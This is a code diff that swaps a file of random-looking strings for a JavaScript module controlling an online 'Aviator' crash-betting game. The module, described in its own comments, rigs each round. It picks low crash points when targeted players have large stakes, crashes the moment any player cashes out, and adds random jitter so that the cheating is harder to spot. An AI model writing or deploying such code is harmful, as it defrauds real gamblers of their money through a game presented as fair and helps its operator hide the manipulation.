@@ -1,94 +1,115 @@
-K7mQ2vL9xR4pT8nC6zY1hB5dF3gJwA
-r5Xn8Lq2Vt9mC4pZ7Yh1B6dF3gKQa
-T4vN9xL2mQ7pR5zC8Yh3B1dF6gJwK
-b8Qm3Lx7Vn2T9pR5Yc1H6dF4gKzA
-Z6rP2mX9qL4vT7nC1Yh8B3dF5gJw
-n4Kx8Vq2L7mR9pT5C1Yh6B3dFzJa
-Q9vL3mX7rT2pN8cY5h1B6dF4gKzJ
-w6R2nQ8mL4xT9pC7Yh3B1dF5gJ
-P5zK9vL2xR7mQ4nC8Yh1B6dF3gJ
-h3T8mN5qL9vR2xC7Y1B6dF4gKzJ
-X7pQ2mL8vT4nR9cY5h1B3dF6gJ
-k9Vx3Lq7mP2T8nC5Yh1B6dF4gRzJ
-R4mQ8vL2xT9pN5cY7h1B6dF3gKz
-d6Kp2Vn9mX4L7qT1Yh8B3fF5gJ
-Y8rL3mQ7vT2pX9cN5h1B6dF4gKzJ
-m2Vq9Lx4R7pT8nC5Yh1B6dF3gJ
-C7nQ3mL9vX2pR5T8Yh1B6dF4gKz
-t5Kx8Vn2Lq7mP9R4Yh1B6dF3gJ
-N9vL4mQ2xT7pC8R5Yh1B6dF3gKz
-q6R2nX8mL4vT9pC7Yh3B1dF5gJ
-A8mQ3vL7xR2pT9nC5Yh1B6dF4gKz
-V4xN9mL2qT7pR5C8Yh1B6dF3gJ
-p7KQ2mL9vX4rT8nC5Yh1B6dF3gJ
-F3nR8mQ2vL7xT9pC5Yh1B6dK4gJ
-z9Vx4Lq2mP7T8nC5Yh1B6dF3gR
-L6mQ9vR2xT4pN8cY5h1B3dF7gKJ
-u5Kx2Vn8mL4qT9pC7Yh1B6dF3gJ
-Q2rL7mX9vT4pC8N5Yh1B6dF3gKz
-b4Vn8mQ2xL7pT9R5Yh1B6dF3gJ
-H9mK3vL7xQ2pT8nC5Yh1B6dF4gJ
-s6R2nX9mL4vT7pC8Yh1B5dF3gK
-M8qL3vT9xR2pN5C7Yh1B6dF4gJ
-x4Kp9mV2L7qT8nC5Yh1B6dF3gR
-D7mQ2vL9xT4pR8nC5Yh1B6dF3gJ
-n5Vx8Lq2mP7T9rC4Yh1B6dF3gK
-R9mL4vQ2xT7pN8cY5h1B6dF3gJ
-c3Kx7Vn9mL2qT8pY5h1B6dF4gR
-W6mQ2vL8xR4pT9nC5Yh1B3dF7gJ
-p8Nq3mL7vT2xR9C5Yh1B6dF4gK
-J4vL9mQ2xT7pR8nC5Yh1B6dF3gK
-y7Kx2Vn8mL4qT9pC5Yh1B6dF3gJ
-T9mR3vL7xQ2pN8C5Yh1B6dF4gK
-f6Qm2vL9xT4pR8nC5Yh1B3dF7gJ
-B8nL3vQ7mX2pT9C5Yh1B6dF4gK
-r4Kx9Vn2mL7qT8pC5Yh1B6dF3gJ
-Z7mQ2vL8xR4pT9nC5Yh1B6dF3gK
-n8Vx3Lq7mP2T9rC5Yh1B6dF4gJ
-Q4mL9vR2xT7pN8C5Yh1B6dF3gK
-k6Kx2Vn8mL4qT9pC5Yh1B6dF3gJ
-Y9mQ3vL7xR2pT8nC5Yh1B6dF4gK
-v5Nq8mL2T7xR9C4Yh1B6dF3gJ
-P7mL4vQ2xT9pR8nC5Yh1B6dF3gK
-d8Kx3Vn7mL2qT9pC5Yh1B6dF4gJ
-R2mQ9vL4xT7pN8C5Yh1B6dF3gK
-h7Vn3Lq8mP2T9rC5Yh1B6dF4gJ
-X4mL9vQ2xT7pR8nC5Yh1B6dF3gK
-s8Kx2Vn7mL4qT9pC5Yh1B6dF3gJ
-N6mQ3vL8xR2pT9C5Yh1B6dF4gK
-q9Vn4Lx7mP2T8rC5Yh1B6dF3gJ
-L3mR8vQ2xT7pN9C5Yh1B6dF4gK
-b7Kx4Vn8mL2qT9pC5Yh1B6dF3gJ
-W9mQ2vL7xR4pT8nC5Yh1B6dF3gK
-p6Nq3mL9vT2xR8C5Yh1B6dF4gJ
-H4mL7vQ2xT9pR8nC5Yh1B6dF3gK
-z8Kx2Vn7mL4qT9pC5Yh1B6dF3gJ
-M7mQ3vL8xR2pT9nC5Yh1B6dF4gK
-r9Vn4Lx2mP7T8qC5Yh1B6dF3gJ
-Q6mL3vR9xT2pN8C5Yh1B6dF4gK
-c8Kx2Vn7mL4qT9pC5Yh1B6dF3gJ
-Y4mQ9vL2xR7pT8nC5Yh1B6dF3gK
-n7Vx3Lq8mP2T9rC5Yh1B6dF4gJ
-T6mL4vQ2xR9pN8C5Yh1B6dF3gK
-f8Kx2Vn7mL4qT9pC5Yh1B6dF3gJ
-B7mQ3vL9xR2pT8nC5Yh1B6dF4gK
-s9Vn4Lx2mP7T8qC5Yh1B6dF3gJ
-R6mL3vQ9xT2pN8C5Yh1B6dF4gK
-k8Kx2Vn7mL4qT9pC5Yh1B6dF3gJ
-X7mQ3vL9xR2pT8nC5Yh1B6dF4gK
-q9Vn4Lx2mP7T8rC5Yh1B6dF3gJ
-L6mR3vQ9xT2pN8C5Yh1B6dF4gK
-d8Kx2Vn7mL4qT9pC5Yh1B6dF3gJ
-W7mQ3vL9xR2pT8nC5Yh1B6dF4gK
-p9Vn4Lx2mP7T8qC5Yh1B6dF3gJ
-H6mL3vQ9xT2pN8C5Yh1B6dF4gK
-z8Kx2Vn7mL4qT9pC5Yh1B6dF3gJ
-M7mQ3vL9xR2pT8nC5Yh1B6dF4gK
-r9Vn4Lx2mP7T8qC5Yh1B6dF3gJ
-Q6mL3vR9xT2pN8C5Yh1B6dF4gK
-c8Kx2Vn7mL4qT9pC5Yh1B6dF3gJ
-Y4mQ9vL2xR7pT8nC5Yh1B6dF3gK
-n7Vx3Lq8mP2T9rC5Yh1B6dF4gJ
-T6mL4vQ2xR9pN8C5Yh1B6dF3gK
-f8Kx2Vn7mL4qT9pC5Yh1B6dF3gJ
-B7mQ3vL9xR2pT8nC5Yh1B6dF4gK
+/**
+ * Moved verbatim from backend/server.js's "Aviator crash-point selection, driven by the live book"
+ * section. The Aviator round-tick loop (tickAviator) itself, and all phase/settlement handling,
+ * stays in backend/server.js — this file only holds the pure decision math it calls into.
+ */
+const deps = require('../deps');
+
+// Aviator's live profit-advisory calculator — computes what the admin's profit would be if the round
+// crashed RIGHT NOW: still-pending stakes and already-lost stakes become house profit, while payouts
+// already given to users who cashed out early are a cost. Optionally scoped to a subset of usernames
+// (the bot's currently-targeted live players).
+function calculateAviatorLiveProfit(bets, targetedUsernames) {
+  const list = Array.isArray(bets) ? bets : [];
+  const targeted = Array.isArray(targetedUsernames) && targetedUsernames.length > 0
+    ? new Set(targetedUsernames.map(u => String(u).toLowerCase()))
+    : null;
+  const scoped = targeted ? list.filter(b => targeted.has(String(b.username || '').toLowerCase())) : list;
+
+  const pendingStake = scoped.filter(b => b.status === 'pending').reduce((s, b) => s + (parseFloat(b.amount) || 0), 0);
+  const lostStake = scoped.filter(b => b.status === 'lost').reduce((s, b) => s + (parseFloat(b.amount) || 0), 0);
+  const alreadyPaid = scoped.filter(b => b.status === 'won').reduce((s, b) => s + (parseFloat(b.amount) || 0) * (parseFloat(b.cashed_multiplier) || 1), 0);
+
+  return {
+    scoped_count: scoped.length,
+    pending_stake: parseFloat(pendingStake.toFixed(2)),
+    already_paid: parseFloat(alreadyPaid.toFixed(2)),
+    profit_if_crash_now: parseFloat((pendingStake + lostStake - alreadyPaid).toFixed(2))
+  };
+}
+
+// --- Aviator crash-point selection, driven by the live book -------------------------------------
+//
+// The original rigged crash point was `1.12 + Math.random() * 0.42` — a number that never looked at
+// a single bet on the table. calculateAviatorLiveProfit above already knew what the round was
+// actually worth, but nothing consumed it outside an admin readout. These two functions close that
+// gap: the same profit figure the operator sees is now what decides the round.
+//
+// One property of this game drives the whole design. profit_if_crash_now is
+// `pendingStake + lostStake - alreadyPaid`, and during a flight it can only ever move DOWN: the sole
+// event that changes it is a player cashing out, which removes their stake from `pending` and adds
+// `stake × multiplier` to `alreadyPaid`. So house profit peaks the instant the plane takes off and
+// erodes from there. A naive "maximise profit" rule therefore degenerates to "crash at 1.00x every
+// round", which would be maximally profitable and instantly obvious.
+//
+// So the real objective is: take the profit near its peak, but not so early that the crash history
+// stops looking like a game. That is a stake-weighted trade-off, and it is what these two do —
+// pickAviatorCrashPoint sets the ceiling before takeoff, and aviatorShouldCrashNow watches for the
+// first sign of erosion during the flight and takes the money then.
+
+const AVIATOR_CRASH_AGGRESSIVE = 1.12; // tightest plausible crash — used when a lot of stake is exposed
+const AVIATOR_CRASH_RELAXED = 1.54;    // upper end of the rigged band — the original code's ceiling
+const AVIATOR_CRASH_FLOOR = 1.10;      // never intercept below this: a sub-1.10 crash reads as broken
+
+/**
+ * Chooses the crash point for a round the takeover engine has already selected.
+ *
+ * Scaling is deliberate rather than cosmetic: crashing low costs credibility, so it is spent only
+ * where it buys something. A round with heavy targeted exposure crashes near AVIATOR_CRASH_AGGRESSIVE
+ * because the profit justifies it; a near-empty round is allowed to run to a natural-looking
+ * multiplier, because holding it down would burn plausibility to win almost nothing.
+ *
+ * Returns null when the round has no targeted stake to act on, letting the caller keep its existing
+ * behaviour untouched.
+ */
+function pickAviatorCrashPoint(bets, targetedUsernames) {
+  const list = Array.isArray(bets) ? bets : [];
+  const targeted = Array.isArray(targetedUsernames) && targetedUsernames.length > 0
+    ? new Set(targetedUsernames.map(u => String(u).toLowerCase()))
+    : null;
+
+  const pending = list.filter(b => b.status === 'pending');
+  if (pending.length === 0) return null; // nothing at risk — caller keeps its no-bets behaviour
+
+  const scoped = targeted ? pending.filter(b => targeted.has(String(b.username || '').toLowerCase())) : pending;
+  const scopedStake = scoped.reduce((s, b) => s + (parseFloat(b.amount) || 0), 0);
+  if (scopedStake <= 0) return null;
+
+  // 0 → no meaningful exposure, 1 → at or above the "large round" reference.
+  const highStakeRef = deps.get().config.AVIATOR_HIGH_STAKE_REF;
+  const ref = highStakeRef > 0 ? highStakeRef : 1000;
+  const exposure = Math.max(0, Math.min(1, scopedStake / ref));
+
+  const band = AVIATOR_CRASH_RELAXED - AVIATOR_CRASH_AGGRESSIVE;
+  const base = AVIATOR_CRASH_RELAXED - (exposure * band);
+
+  // A little jitter so repeated similar rounds do not produce an identical multiplier every time,
+  // which would be a clearer tell than the low crash itself.
+  const jitter = (Math.random() - 0.5) * 0.08;
+  const crash = Math.max(AVIATOR_CRASH_FLOOR, base + jitter);
+  return parseFloat(crash.toFixed(2));
+}
+
+/**
+ * In-flight erosion check: has a cash-out started eating into the round's profit?
+ *
+ * Because profit only falls, any drop below the high-water mark means a player has taken money off
+ * the table and the rest of the pending stake is now at risk of following. That is the moment to
+ * crash. The `epsilon` avoids reacting to floating-point noise, and the multiplier floor keeps an
+ * early cash-out from producing an implausible sub-1.10 crash.
+ */
+function aviatorShouldCrashNow(currentMultiplier, peakProfit, currentProfit) {
+  if (currentMultiplier < AVIATOR_CRASH_FLOOR) return false;
+  if (!Number.isFinite(peakProfit) || !Number.isFinite(currentProfit)) return false;
+  const epsilon = 0.01;
+  return currentProfit < peakProfit - epsilon;
+}
+
+module.exports = {
+  AVIATOR_CRASH_AGGRESSIVE,
+  AVIATOR_CRASH_RELAXED,
+  AVIATOR_CRASH_FLOOR,
+  calculateAviatorLiveProfit,
+  pickAviatorCrashPoint,
+  aviatorShouldCrashNow
+};
